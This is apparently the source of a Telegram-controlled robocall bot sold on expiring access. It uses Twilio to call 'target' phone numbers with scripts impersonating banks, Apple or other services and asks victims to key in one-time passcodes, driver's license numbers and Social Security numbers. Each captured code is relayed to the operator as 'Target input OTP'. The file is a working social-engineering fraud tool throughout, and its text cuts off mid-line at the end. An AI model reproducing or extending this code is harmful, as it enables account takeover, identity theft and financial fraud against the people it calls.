import flask
from datetime import *
from flask import Flask, session
import requests
import time
import phonenumbers
import telebot
import twilio
from phonenumbers import NumberParseException
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.twiml.messaging_response import MessagingResponse
from flask import Flask, request
from telebot import types
from twilio.rest import Client
import sqlite3
from Database import *
from Info import *

path = 'UsersDatabase.db'
conn = sqlite3.connect(path, check_same_thread=False)

c = conn.cursor()

client = Client(account_sid, auth_token)

app = Flask(__name__)

bot = telebot.TeleBot(API_TOKEN, threaded=False)
bot.remove_webhook()
bot.set_webhook(url=callurl)


@app.route('/', methods=['GET', 'POST'])
def webhook():
    if flask.request.headers.get('content-type') == 'application/json':
        json_string = flask.request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    else:
        print("error")
        flask.abort(403)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    id = message.from_user.id
    print(id)
    print(check_user(id))
    print(check_admin(id))
    print(fetch_expiry_date(id))
    if check_user(id) and check_expiry_days(id) > 0:
        days_left = check_expiry_days(id)
        name = message.from_user.first_name
        bot.send_message(message.chat.id, f"*Hey {name}\n⚠️You have {days_left} days left❗️*", parse_mode='Markdown')
    else:
        send = bot.send_message(message.chat.id, "*You do not have access to this bot, fuck off.*", parse_mode='Markdown')

@bot.message_handler(commands=['target'])
def targetnum(message):
    id = message.from_user.id
    print(id)
    print(check_user(id))
    print(check_admin(id))
    print(fetch_expiry_date(id))
    if check_user(id) and check_expiry_days(id) > 0:
        days_left = check_expiry_days(id)
        name = message.from_user.first_name
        send = bot.send_message(message.chat.id, "*▫️Send Target Phone Number📱*", parse_mode='Markdown')
        bot.register_next_step_handler(send, saving_phonenumber)
    else:
        send = bot.send_message(message.chat.id, "*You do not have access to this bot, fuck off.*", parse_mode='Markdown')

def saving_phonenumber(message):
    userid = message.from_user.id
    no_to_be_saved = str(message.text)
    z = phonenumbers.parse(no_to_be_saved, "US")
    try:
        if phonenumbers.is_valid_number(z):
            save_phonenumber(no_to_be_saved, userid)
            bot.send_message(message.chat.id, "*▫️Number confirmed ☑️*", parse_mode='Markdown')
        else:
            send = bot.send_message(message.chat.id, "*▫️Invalid Number ❌ Use US numbers ONLY.*", parse_mode='Markdown')
            saving_phonenumber(send)
    except phonenumbers.NumberParseException:
        send = bot.send_message(message.chat.id, "*Invalid Number ❌*", parse_mode='Markdown')
        saving_phonenumber(send)

@bot.message_handler(commands=['script'])
def custom_script(message):
    send = bot.send_message(message.chat.id, 'When writing the initial script, ensure you end by telling the target to press 1 then pound to continue."')
    send1 = bot.send_message(message.chat.id, "*Sample Script*", parse_mode='Markdown')
    send2 = bot.send_message(message.chat.id,
                             "*Use commas where full stops should be, and use commas where commas should be also*",
                             parse_mode='Markdown')
    send2 = bot.send_message(message.chat.id, "Please enter the initial script: \n\n(e.g..'hello john this is chase bank calling, we need to verify some online activity related to your account. to continue press 1 followed by pound.')")
    bot.register_next_step_handler(send2, savings_script)

def savings_script(message):
    script_to_be_saved = message.text
    userid = message.from_user.id
    save_script(script_to_be_saved, userid)
    send = bot.send_message(message.chat.id, "*Your script has been saved for one-time use.*", parse_mode='Markdown')
    enter_options(send)

def enter_options(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="1")
    item2 = types.KeyboardButton(text="2")
    keyboard.add(item1, item2)
    send = bot.reply_to(message, "Enter the number of requests you want to make to the victim: ", reply_markup=keyboard)
    bot.register_next_step_handler(send, saving_options0)

def saving_options0(message):
    userid = message.from_user.id
    option_number = message.text
    save_option_number(option_number, userid)
    if option_number == "1":
        send0 = bot.send_message(message.chat.id,
                                'Be sure to end the text with \n"followed by pound" or "then press pound".\n\n(e.g., "Please enter your 9-digit SSN followed by pound key")')
        send = bot.send_message(message.chat.id,"Please enter the input option:")
        bot.register_next_step_handler(send, saving_options1)

    elif option_number == "2":
        send = bot.send_message(message.chat.id,
                                'Be sure to end the text with \n"followed by pound" or "then press pound".\n\n(e.g., "Please enter your 9-digit SSN followed by pound key")')
        send = bot.send_message(message.chat.id,"Please enter your first input option:")
        bot.register_next_step_handler(send, saving_options2)

    else:
        send = bot.send_message(message.chat.id,"You have selected an invalid option.\n\nPlease use the /start command again.")

def saving_options1(message):
    userid = message.from_user.id
    try:
        option1 = message.text
        save_option1(option1, userid)
    except TypeError:
        bot.send_message(message.chat.id, "Your input option should be text!\n\nUse /Help command for more info to start or continue.")
    else:
        send = bot.send_message(message.chat.id, "Success! Say 'call' to call now\n\nOr Reply 'cancel' to cancel and restart.")
        bot.register_next_step_handler(send, making_call_custom)

def saving_options2(message):
    userid = message.from_user.id
    try:
        option1 = message.text
        save_option1(option1, userid)
    except TypeError:
        bot.send_message(message.chat.id, "Your input option should be text!\n\nUse /Help command for more info to continue.")
    else:
        send = bot.send_message(message.chat.id, "Please enter the second input request for target:")
        bot.register_next_step_handler(send, saving_options3)

def saving_options3(message):
    userid = message.from_user.id
    try:
        option2 = message.text
        save_option2(option2, userid)
    except TypeError:
        bot.send_message(message.chat.id, "Your input option should be text!\n\nUse /Help command for more info to continue.")
    else:
        send = bot.send_message(message.chat.id, 'Success! Say "call" to call now.')
        bot.register_next_step_handler(send, making_call_custom)

def making_call_custom(message):
    if message.text == "call":
        userid = str(message.from_user.id)
        chat_id = message.chat.id
        ph_no = fetch_phonenumber(userid)
        print(ph_no)
        try:
            call = client.calls.create(record=True,
                                   status_callback=(callurl + '/statuscallback/'+userid),
                                   recording_status_callback=(callurl + '/details_rec/'+userid),
                                   status_callback_event=['ringing', 'answered', 'completed'],
                                   url=(callurl + '/custom/'+userid),
                                   to=ph_no,
                                   from_=twilionumber,
                                   machine_detection='Enable')
        except:
            bot.send_message(message.chat.id, "Sorry, I am currently unable to make calls.\n\nContact Ryan.")
        else:
            print(call.sid)
            send = bot.send_message(message.chat.id, "*Calling with custom script ☎️...*",parse_mode='Markdown')

    elif message.text == "cancel":
        bot.send_message(message.chat.id, 'Call has been canceled')
        send_welcome(message)

@bot.message_handler(commands=['otp'])
def pick_Normotp(message):
    userid = message.from_user.id
    send = bot.send_message(message.chat.id, "*Okay ✅ \n▫️Send The Target's Name*", parse_mode='Markdown')
    bot.register_next_step_handler(send, tarnamen)
    
def tarnamen(message):
    userid = message.from_user.id
    name_tobesaved = str(message.text)
    print(name_tobesaved)
    save_targetname(name_tobesaved, userid)
    send = bot.send_message(message.chat.id, '*Okay✅\n\nNow Send The Service Name 📡*',parse_mode='Markdown')
    bot.register_next_step_handler(send, nonameotpn)

def nonameotpn(message):
    userid = message.from_user.id
    name_tobesaved = str(message.text)
    print(name_tobesaved)
    save_bankName(name_tobesaved, userid)
    send = bot.send_message(message.chat.id, '*Okay✅ Reply “Call” to begin the call.\n\nOr Reply "cancel" to cancel and restart*',parse_mode='Markdown')
    bot.register_next_step_handler(send, make_call_otpn)

def make_call_otpn(message):
    if message.text == "call":
        userid = str(message.from_user.id)
        chat_id = userid
        phonenumber = fetch_phonenumber(userid)
        print(phonenumber)
        call = client.calls.create(record=True,
                               status_callback=(callurl +'/statuscallback/'+userid),
                               recording_status_callback=(callurl + '/details_rec/'+userid),
                               status_callback_event=['ringing', 'answered', 'completed'],
                               url=(callurl + '/wfn/'+userid),
                               to=phonenumber,
                               from_=twilionumber,
                               machine_detection='Enable')
        print(call.sid)
        send = bot.send_message(message.chat.id, "*Calling for Normal OTP ☎️...*",parse_mode='Markdown')

    elif message.text == "cancel":
        send_welcome(message)

@app.route("/wf/<userid>", methods=['GET', 'POST'])
def voice_wf(userid):
    print(userid)
    targetname = fetch_targetname(userid)
    bankname = fetch_bankname(userid)
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human':
        resp.say(f",,,Hello {targetname}, this is the {bankname} fraud prevention line. There was an attempt to change your password from an unrecognized device,")
        gather = Gather(num_digits=1, action=f'/gather/{userid}', timeout=120)
        gather.say('If this was not you, please press 1. Otherwise, you may ignore this message and hang up.')
        resp.append(gather)
        resp.redirect(f'/wf/{userid}')
        return str(resp)
    else:
        resp.hangup()
        bot.send_message(userid, "*Call Was Declined or Voicemail was detected ❌*", parse_mode='Markdown')
        return str(resp)
        
@app.route("/wfn/<userid>", methods=['GET', 'POST'])
def voice_wfn(userid):
    print(userid)
    targetname = fetch_targetname(userid)
    bankname = fetch_bankname(userid)
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        resp.say(f",,,Hello {targetname}, this is an automated call from {bankname}. There was an attempt to change your password from an unrecognized device,")
        gather = Gather(num_digits=1, action=f'/gather/{userid}', timeout=120)
        gather.say('If this was not you, please press 1. Otherwise, you may ignore this message and hang up.')
        resp.append(gather)
        resp.redirect(f'/wfn/{userid}')
        return str(resp)
    else:
        resp.hangup()
        bot.send_message(userid, "*Call Was Declined or Voicemail was detected ❌*", parse_mode='Markdown')
        return str(resp)

@app.route("/wfA/<userid>", methods=['GET', 'POST'])
def voice_wfA(userid):
    print(userid)
    targetname = fetch_targetname(userid)
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        resp.say(f",,,Hello {targetname}, this is an automated call from Apple inc. There was an attempt to change your password from an unrecognized device,")
        gather = Gather(num_digits=1, action=f'/gather/{userid}', timeout=120)
        gather.say('If this was not you, please press 1. Otherwise, you may ignore this message and hang up.')
        resp.append(gather)
        resp.redirect(f'/wfA/{userid}')
        return str(resp)
    else:
        resp.hangup()
        bot.send_message(userid, "*Call Was Declined or Voicemail was detected ❌*", parse_mode='Markdown')
        return str(resp)

@app.route("/wfm/<userid>", methods=['GET', 'POST'])
def voice_wfm(userid):
    print(userid)
    targetname = fetch_targetname(userid)
    bankname = fetch_bankname(userid)
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        resp.say(f",,,Hello {targetname}, this is an automated call from {bankname}. There has been an request to change the e-mail on your account from an unrecognized device")
        gather = Gather(num_digits=1, action=f'/gather/{userid}', timeout=120)
        gather.say('If this was not you, please press 1. Otherwise, you may ignore this message and hang up.')
        resp.append(gather)
        resp.redirect(f'/wfm/{userid}')
        return str(resp)
    else:
        resp.hangup()
        bot.send_message(userid, "*Call Was Declined or Voicemail was detected ❌*", parse_mode='Markdown')
        return str(resp)
        
@app.route('/gather/<userid>', methods=['GET', 'POST'])
def gather(userid):
    chat_id = userid
    resp = VoiceResponse()
    if 'Digits' in request.values:
        choice = request.values['Digits']
        if choice == '1':
            bot.send_message(chat_id, "The target pressed 1")
            gather_otp = Gather(action=f'/gatherotp/{userid}', num_digits=6, timeout=120)
            gather_otp.say("To block the request, please enter the 6 digit security code we sent to your mobile device.")
            resp.append(gather_otp)
            resp.redirect(f'/gather/{userid}')
            return str(resp)
        else:
            resp.say("Sorry, please press 1 or hang up.")
            resp.redirect(f'/wf/{userid}')
            return str(resp)

@app.route('/gatherotp/<userid>', methods=['GET', 'POST'])
def gatherotp(userid):
    chat_id = userid
    resp = VoiceResponse()
    resp.say('Please give us a moment to block the request.')
    if 'Digits' in request.values:
        resp.play(url='https://ia904701.us.archive.org/33/items/music_20221124/music.mp3')
        otp = request.values['Digits']
        bot.send_message(chat_id, f"Target input OTP: {otp}")
        resp.say(f"We have successfully blocked the request and your account information will remain the same. However, we may call you again if more information is needed. Thank you and good-bye.")
        return str(resp)
    else:
        resp.say("Sorry, please make the correct choice.")
        resp.redirect(f'/gather/{userid}')
        bot.send_message(chat_id, "*No input detected*, asking target again")
        return str(resp)

        
@app.route("/dl_md/<userid>", methods=['GET', 'POST'])
def resp_dl_md(userid):
    print(userid)
    targetname = fetch_targetname(userid)
    bankname = fetch_bankname(userid)
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        resp.say(f"Hello {targetname}, this is the {bankname} fraud prevention line. There has been a suspicious application submitted for a loan in the amount of $45,000")
        gather = Gather(action=f'/gatherdl/{userid}', num_digits=1, timeout=120)
        gather.say("If this was not you, please press 1. Otherwise, you may ignore this message and hang up.")
        resp.append(gather)
        resp.redirect(f'/dl_md/{userid}')
        return str(resp)
    else:
        resp.hangup()
        bot.send_message(userid, "*Call Was Declined or Voicemail was detected ❌*", parse_mode='Markdown')
        return str(resp)

@app.route('/gatherdl/<userid>', methods=['GET', 'POST'])
def gatherdl(userid):
    chat_id = userid
    resp = VoiceResponse()
    if 'Digits' in request.values:
        choice = request.values['Digits']
        if choice == '1':
            bot.send_message(chat_id, "The target pressed 1")
            gather = Gather(action=f'/gatherdl0/{userid}', finish_on_key='#', input='dtmf', timeout=120)
            gather.say(f"In order to cancel this application we will need to verify your identity, please enter your driver's license or state identification number followed by the pound key.")
            resp.append(gather)
            resp.redirect(f'/gatherdl/{userid}')
            return str(resp)
        else:
            resp.say("Sorry, please press 1 or hang up.")
            resp.redirect(f'/dl_md/{userid}')
            return str(resp)

@app.route("/gatherdl0/<userid>", methods=['GET', 'POST'])
def gatherdll(userid):
    chat_id = userid
    resp = VoiceResponse()
    resp.say('Please give us a moment to block the request.')
    if 'Digits' in request.values:
        resp.play(url='https://ia904701.us.archive.org/33/items/music_20221124/music.mp3')
        otp = request.values['Digits']
        bot.send_message(chat_id, f"Target input OTP: {otp}")
        resp.say('We have successfully canceled the application. However, we may call you again if more information is needed. Thank you and good-bye.')
        return str(resp)
    else:
        resp.say("Sorry, please make the correct choice.")
        resp.redirect(f'/gatherdl0/{userid}')
        bot.send_message(chat_id, "*No input detected*, asking target again")


@app.route("/ssn_md/<userid>", methods=['GET', 'POST'])
def gatherssn(userid):
    print(userid)
    targetname = fetch_targetname(userid)
    bankname = fetch_bankname(userid)
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        resp.say(f",,,Hello {targetname}, this is the {bankname} fraud prevention line. there has been an request to change the mailing address on your account.")
        gather = Gather(action=f'/gatherssn1/{userid}', num_digits=1, timeout=120)
        gather.say("If this was not you, please press 1. Otherwise, you may ignore this message and hang up.")
        resp.append(gather)
        resp.redirect(f'/ssn_md/{userid}')
        return str(resp)
    else:
        resp.hangup()
        bot.send_message(userid, "*Call Was Declined or Voicemail was detected ❌*", parse_mode='Markdown')
        return str(resp)

@app.route('/gatherssn1/<userid>', methods=['GET', 'POST'])
def gatherssn1(userid):
    chat_id = userid
    resp = VoiceResponse()
    if 'Digits' in request.values:
        choice = request.values['Digits']
        if choice == '1':
            bot.send_message(chat_id, "The target pressed 1")
            gather = Gather(action=f'/gatherssn2/{userid}', num_digits=9, timeout=120)
            gather.say(f"In order to block the request we'll need to verify your identity, please enter your 9-digit social security number followed by pound.")
            resp.append(gather)
            resp.redirect(f'/gatherssn1/{userid}')
            return str(resp)
        else:
            resp.say("Sorry, please press 1 or hang up.")
            resp.redirect(f'/ssn_md/{userid}')
            return str(resp)

@app.route("/gatherssn2/<userid>", methods=['GET', 'POST'])
def gatherssn2(userid):
    chat_id = userid
    resp = VoiceResponse()
    resp.say('Please give us a moment to validate your information.')
    if 'Digits' in request.values:
        # Get which digit the caller chose
        resp.play(url='https://ia904701.us.a
